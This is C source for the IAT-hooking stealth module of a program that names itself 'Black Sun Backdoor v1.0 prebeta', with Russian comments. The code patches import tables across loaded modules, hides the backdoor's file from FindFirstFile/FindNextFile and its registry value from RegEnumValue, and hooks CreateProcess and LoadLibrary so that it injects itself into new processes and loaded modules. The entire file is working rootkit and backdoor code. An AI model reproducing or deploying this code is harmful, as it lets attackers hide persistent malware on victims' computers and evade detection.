/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *                 Black Sun Backdoor v1.0 prebeta        
 *
 *                          (x) Cytech 2007
 *
 *  ---------------------------------------------------------------------
 *  [iathooking.h]
 *      модуль перехвата API методом модификации таблицы импорта (IAT) 
 *      в адресном пространстве чужого процесса по "Рихтеру".
 *  ---------------------------------------------------------------------
 */


// ----- [ функция модификации таблицы импорта в заданном модуле ] ----- //

#define MakePtr(Type, BaseAddr, RVA) ((Type)((DWORD)(BaseAddr) + (DWORD)(RVA)))

static DWORD WINAPI ReplaceIAT(PCSTR pszCModName, PROC pfnCurrent, PROC pfnNew, HMODULE hCModule)
{ 
	PULONG ulSize;
	DWORD dwOrgProtect, dwBase;
	
	PIMAGE_DOS_HEADER pDOSHeader;
    PIMAGE_NT_HEADERS pNTHeaders;
	PIMAGE_IMPORT_DESCRIPTOR pIATDesc;
	PIMAGE_THUNK_DATA pThunk;

	PSTR pszModName; 
	PROC* ppfn;
	
    pDOSHeader = (PIMAGE_DOS_HEADER)hCModule;
	
    if(pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE)  // проверка DOS хэдера
	{
		return 0; 
	}
   
    pNTHeaders = MakePtr(PIMAGE_NT_HEADERS, pDOSHeader, pDOSHeader -> e_lfanew); // проверка NT хэдера
	
    if(pNTHeaders->Signature != IMAGE_NT_SIGNATURE)
	{	
		return 0;
	}

	// Находим в модуле смещение RVA на IAT. Функция должна вернуть нам дескриптор IAT 
	// если все прошло успешно, в ином случае NULL (значит в модуле нет таблицы импорта)
	
	pIATDesc = (PIMAGE_IMPORT_DESCRIPTOR)	
	ImageDirectoryEntryToData(hCModule, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &ulSize);

	/*     
	 *     ок, таблица импорта у нас в кармане. вот интересующая нас структура IAT:
	 *     
	 * 		typedef struct _IMAGE_IMPORT_DESCRIPTOR 
	 *		{
	 *				union {
	 *						DWORD   Characteristics;     // 0 for terminating null import descriptor
	 *						DWORD   OriginalFirstThunk;  // RVA to original unbound IAT (PIMAGE_THUNK_DATA)
	 *					  };
	 *				DWORD   TimeDateStamp;               // 0 if not bound,
	 *												     // -1 if bound, and real date\time stamp
	 *												     //   in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)
	 *													 // O.W. date/time stamp of DLL bound to (Old BIND)
	 *				DWORD   ForwarderChain;              // -1 if no forwarders
	 *				DWORD   Name;
	 *				DWORD   FirstThunk;                  // RVA to IAT (if bound this IAT has actual addresses)
	 *		} IMAGE_IMPORT_DESCRIPTOR;
	 *
	 *		typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;
	 */

	if (pIATDesc == NULL) return FALSE;
	
	// находим дескриптором необходимый раздел импорта, нас интересует раздел IAT -> Name,
	// то есть имена модулей, из которых импортируются необходимые для нас функции
	// перечисляем до тех пор пока pszModName == kernel32.dll и затем завершаем цикл,
	// в ином случае (если цикл не брякнулся) модуль не импортирует никаких функций
	
	for (; pIATDesc->Name; pIATDesc++) 
	{
	  pszModName = (PSTR) ((PBYTE) hCModule + pIATDesc->Name);
	  if (lstrcmpi(pszModName, pszCModName) == 0) break; 
	}
	if (pIATDesc->Name == 0) return FALSE;

	//   получаем таблицу адресов импорта (IAT->FirstThunk)

	pThunk = (PIMAGE_THUNK_DATA) 
	((PBYTE) hCModule + pIATDesc->FirstThunk); 
	
	// теперь для каждого модуля перечисляем все адреса функций
	// и сравниваем с адресом необходмой нам функции (то есть той,
    // которую мы будем сплайсить):
	// если ppfn(адрес функциии 'x' в IAT->Thunk) == GetProcAddress("module", 'x') то 
	// патчим адреса в IAT на свои:	
	// пример сплайсинга на RegEnumValueW в RegEdit.exe:
	//
	// было:
	// 				01001080 > . 0F77DC77       DD ADVAPI32.RegOpenKeyW
	// 				01001084 > . CCD7DC77       DD ADVAPI32.RegSetValueExW
	// 				01001088 > . 7D8FDE77       DD ADVAPI32.RegCreateKeyW
	// 				0100108C > . 8180DC77       DD ADVAPI32.RegEnumValueW <-- RegEnumValueW
	// 				01001090 > . 49D6DC77       DD ADVAPI32.RegEnumKeyW
	// стало:
	// 				01001080 > . 0F77DC77       DD ADVAPI32.RegOpenKeyW
	// 				01001084 > . CCD7DC77       DD ADVAPI32.RegSetValueExW
	// 				01001088 > . 7D8FDE77       DD ADVAPI32.RegCreateKeyW
	// 				0100108C > . 74130048       DD 48001374      <---- pwned :D BASEADDRESS был 0x48000000
	// 				01001090 > . 49D6DC77       DD ADVAPI32.RegEnumKeyW

	
	for (; pThunk->u1.Function; pThunk++) 
	{
		ppfn = (PROC*) &pThunk->u1.Function;

		if(*ppfn == pfnCurrent) 
		{ 
			VirtualProtect(ppfn, sizeof(pfnNew), PAGE_READWRITE, &dwOrgProtect);
			
				WriteProcessMemory
				(
					GetCurrentProcess(), // патчим в текущем процессе
					ppfn, 				 // старый адрес функции
					&pfnNew, 			 // наша новая функция 'x'
					sizeof(pfnNew),		 // размер новой функции 'x'
					NULL            	 // нам это не надо
				);
			
			VirtualProtect(ppfn, sizeof(pfnNew), dwOrgProtect , &dwOrgProtect);
			return TRUE;
		} 
	} 
		// если нету интересующей нас функции, то выходим )
		return FALSE;
}

// --- [ функция перечисления всех модулей для отдельного процесса ] --- //

static DWORD WINAPI ReplaceIATEntryInAllMods(PCSTR pszCModName, PROC pfnCurrent, PROC pfnNew) 
{
	HANDLE m_Snap = INVALID_HANDLE_VALUE;
	MODULEENTRY32 me = { sizeof(me) };
	
	m_Snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
	
	if (m_Snap == INVALID_HANDLE_VALUE) return 0; 
	if (!Module32First(m_Snap, &me)) return 0;

	do 
	{
		ReplaceIAT(pszCModName, pfnCurrent, pfnNew, me.hModule); // patch it!
	} while (Module32Next(m_Snap, &me)); 
	
	return 0;
}

// ------------------ [ версии заменяемых функций ] -------------------- //

/*  // test, test :)
 *  int __stdcall xMessageBoxW(HWND hwnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)
 *  {
 *  	return MessageBoxW(hwnd,L"this messagebox was 0wn3d",lpCaption,uType);
 *  }
 *
 */
	
// -----------------------------------------------------------------------------------------
// ANSI и UNICODE версии FindFirstFile/FindNexFile.
// Сплайсинг этих функций необходим для сокрытия своих файлов в системе.
// -----------------------------------------------------------------------------------------

static HANDLE WINAPI xFindFirstFileW (PCWSTR lpFileName, PWIN32_FIND_DATAW lpFindFileData)
{
	char szName [256];
	HANDLE ret = FindFirstFileW(lpFileName, lpFindFileData);
	WideCharToMultiByte(CP_ACP, 0, lpFindFileData->cFileName, -1, szName, 256, NULL, NULL);

	if (lstrcmpiA(szName, EXENAME) == 0)
	{
		if (!FindNextFileW(ret, lpFindFileData)) 
		{
			SetLastError(ERROR_NO_MORE_FILES);
			return INVALID_HANDLE_VALUE;
		}
	}
	return ret;
}

static BOOL WINAPI xFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	char szName [256];
	BOOL ret = FindNextFileW(hFindFile, lpFindFileData);
	WideCharToMultiByte(CP_ACP, 0,lpFindFileData->cFileName, -1, szName, 256, NULL, NULL);

	if (lstrcmpiA(szName, EXENAME) == 0)
	{
		ret = FindNextFileW(hFindFile, lpFindFileData);
	}
	return ret;
}

static HANDLE WINAPI xFindFirstFileA (PCSTR lpFileName, PWIN32_FIND_DATAA lpFindFileData)
{
	HANDLE ret = FindFirstFileA(lpFileName, lpFindFileData);
	if (lstrcmpiA(lpFindFileData->cFileName,EXENAME) == 0)
	{
		if (!FindNextFileA(ret, lpFindFileData)) {
			SetLastError(ERROR_NO_MORE_FILES);
			return INVALID_HANDLE_VALUE;
		}
	}
	return ret;
}

static BOOL WINAPI xFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
	BOOL ret = FindNextFileA(hFindFile, lpFindFileData);
	if (lstrcmpiA(lpFindFileData->cFileName, EXENAME) == 0)
	{
		ret = FindNextFileA(hFindFile, lpFindFileData);
	}
	return ret;
}

// -----------------------------------------------------------------------------------------
// ANSI и UNICODE версии RegEnumValue.
// Сплайсинг этих функции необходим для сокрытия своих ключей в реестре
// -----------------------------------------------------------------------------------------

static LONG WINAPI xRegEnumValueA(HKEY hKey, DWORD dwIndex, LPSTR lpValueName, 
				  LPDWORD lpcValueName,  LPDWORD lpReserved, 
				  LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
{
	LONG ret = RegEnumValueA(hKey, dwIndex, lpValueName, 
		lpcValueName,  lpReserved, lpType, lpData, lpcbData);

	if (lstrcmpiA(lpValueName,REGNAME) == 0)
		return 1;

	return ret;
}

static LONG WINAPI xRegEnumValueW(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, 
				  LPDWORD lpcValueName,  LPDWORD lpReserved, 
				  LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
{
	char szName [256];
	LONG ret = RegEnumValueW(hKey, dwIndex, lpValueName, 
		lpcValueName,  lpReserved, lpType, lpData, lpcbData);
	WideCharToMultiByte(CP_ACP, 0, lpValueName, -1, szName, 256, NULL, NULL);

	if (lstrcmpiA(szName,REGNAME) == 0)
		return 1;
	return ret;
}


// -----------------------------------------------------------------------------------------
// ANSI и UNICODE версии CreteProcess. 
// Сплайсинг этих функций необходим для того,чтобы инжектировать себя в запускаемые процессы
// -----------------------------------------------------------------------------------------


static BOOL WINAPI xCreateProcessA(LPCSTR lpApplicationName, 
	LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, 
	DWORD dwCreationFlags, LPVOID lpEnvironment, 
	LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, 
	LPPROCESS_INFORMATION lpProcessInformation)
{
	BOOL ret, b;	
	DWORD dwRmtThdID, dwStInj;	

	ret = CreateProcessA(lpApplicationName, lpCommandLine, 
							 lpProcessAttributes,
							 lpThreadAttributes, 
							 bInheritHandles, dwCreationFlags | CREATE_SUSPENDED, 
							 lpEnvironment, lpCurrentDirectory, 
							 lpStartupInfo, 
							 lpProcessInformation);
							 
	dwStInj = StartProcInject(lpProcessInformation->dwProcessId, NULL, StealthMain);
				
		if(StartProcInject)
		{
			ResumeThread(lpProcessInformation->hThread);
		}

	return ret;
}

static BOOL WINAPI xCreateProcessW(LPCWSTR lpApplicationName, 
	LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, 
	DWORD dwCreationFlags, LPVOID lpEnvironment, 
	LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, 
	LPPROCESS_INFORMATION lpProcessInformation)
{
	BOOL ret, b;	
	DWORD dwRmtThdID, dwStInj;	

	ret = CreateProcessW(lpApplicationName, lpCommandLine, 
							 lpProcessAttributes,
							 lpThreadAttributes, 
							 bInheritHandles, dwCreationFlags | CREATE_SUSPENDED, 
							 lpEnvironment, lpCurrentDirectory, 
							 lpStartupInfo, 
							 lpProcessInformation);
							 
	dwStInj = StartProcInject(lpProcessInformation->dwProcessId, NULL, StealthMain);
				
		if(dwStInj)
		{
			ResumeThread(lpProcessInformation->hThread);
		}

	return ret;
}

// -----------------------------------------------------------------------------------------
// ANSI и UNICODE версии LoadLibrary/LoadLibraryEx. 
// Сплайсинг этих функций необходим для того,чтобы инжектировать себя в подгужаемые модули
// -----------------------------------------------------------------------------------------

static HMODULE WINAPI xLoadLibraryA(PCSTR a)
{
	HMODULE ret = LoadLibraryA(a);
	if (ret != NULL) SetUpStealthHooks(ret);
	return ret;
}

static HMODULE WINAPI xLoadLibraryW(PCWSTR a)
{
	HMODULE ret = LoadLibraryW(a);
	if (ret != NULL) SetUpStealthHooks(ret);
	return ret;
}

static HMODULE WINAPI xLoadLibraryExA(PCSTR a, HANDLE b, DWORD c)
{
	HMODULE ret = LoadLibraryExA(a,b,c);
	if ((ret!=NULL)&&(c & LOAD_LIBRARY_AS_DATAFILE)==0) SetUpStealthHooks(ret);
	return ret;
}

static HMODULE WINAPI xLoadLibraryExW(PCWSTR a, HANDLE b, DWORD c)
{
	HMODULE ret = LoadLibraryExW(a,b,c);
	if ((ret!=NULL)&&(c & LOAD_LIBRARY_AS_DATAFILE)==0) SetUpStealthHooks(ret);
	return ret;
}	

// ---------------- [ сплайсинг для одного определенного модуля ] ------------------- //

static DWORD WINAPI SetUpStealthHooks(HANDLE hmodCaller)
{
	
	/* // test, test :)
	 *  ReplaceIAT // MessageBoxW
	 *  (
	 *  			"user32.dll", 
	 *  			GetProcAddress(GetModuleHandle("user32.dll"),"MessageBoxW"), 
	 *  			(PROC)xMessageBoxW, 
	 *  			hmodCaller
	 *  );
	 */	

	ReplaceIAT // RegEnumValueW
	(
		ADVAPI32_DLL, 
		GetProcAddress(GetModuleHandle(ADVAPI32_DLL), "RegEnumValueW"),
		(PROC)xRegEnumValueW, 
		hmodCaller
	);
	
	ReplaceIAT // RegEnumValueA
	(
		ADVAPI32_DLL, 
		GetProcAddress(GetModuleHandle(ADVAPI32_DLL), "RegEnumValueA"),
		(PROC)xRegEnumValueA, 
		hmodCaller
	);

	ReplaceIAT // FindFirstFileA
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"FindFirstFileA"), 
		(PROC)xFindFirstFileA, 
		hmodCaller
	);
	ReplaceIAT //FindNextFileA
	(
		KERNEL32_DLL,
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"FindNextFileA"), 
		(PROC)xFindNextFileA, 
		hmodCaller
	);
	ReplaceIAT // FindFirstFileW
	(
		KERNEL32_DLL,
		GetProcAddress(GetModuleHandle(KERNEL32_DLL), "FindFirstFileW"), 
		(PROC)xFindFirstFileW, 
		hmodCaller
	);
	ReplaceIAT // FindNextFileW
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"FindNextFileW"), 
		(PROC)xFindNextFileW, 
		hmodCaller
    );

	ReplaceIAT // LoadLibraryA
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"LoadLibraryA"), 
		(PROC)xLoadLibraryA, 
		hmodCaller
	);
	ReplaceIAT // LoadLibraryW
	(
		KERNEL32_DLL, 
		GetProcAddress(	GetModuleHandle(KERNEL32_DLL),"LoadLibraryW"), 
		(PROC)xLoadLibraryW, 
		hmodCaller
	);
	ReplaceIAT // LoadLibraryExA
	(
		KERNEL32_DLL,
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"LoadLibraryExA"), 
		(PROC)xLoadLibraryExA, 
		hmodCaller
	);
	ReplaceIAT // LoadLibraryExW
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"LoadLibraryExW"), 
		(PROC)xLoadLibraryExW, 
		hmodCaller
	);

return 0;
}

// ------------------ [ сплайсинг во всех модулях ] -------------------- //

static DWORD WINAPI Stealth()
{

	ReplaceIATEntryInAllMods
	(
		ADVAPI32_DLL, 
		GetProcAddress(GetModuleHandle(ADVAPI32_DLL), "RegEnumValueA"), 
		(PROC)xRegEnumValueA
	);

	ReplaceIATEntryInAllMods
	(
		ADVAPI32_DLL, 
		GetProcAddress(GetModuleHandle(ADVAPI32_DLL),"RegEnumValueW"), 
		(PROC)xRegEnumValueW
	);

	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"CreateProcessA"), 
		(PROC)xCreateProcessA
	);	
	
	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL), "CreateProcessW"), 
		(PROC)xCreateProcessW
	);
	
	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"FindFirstFileA"),
		(PROC)xFindFirstFileA
	);
	
	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL,
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"FindNextFileA"), 
		(PROC)xFindNextFileA
	);
	
	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"FindFirstFileW"), 
		(PROC)xFindFirstFileW
	);
	
	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL,
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"FindNextFileW"),
		(PROC)xFindNextFileW
	);

	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL,
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"LoadLibraryA"),
		(PROC)xLoadLibraryA
	);
	
	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"LoadLibraryW"), 
		(PROC)xLoadLibraryW
	);
	
	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"LoadLibraryExA"),
		(PROC)xLoadLibraryExA
	);
	
	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"LoadLibraryExW"),
		(PROC)xLoadLibraryExW
	);

	return 0; 
}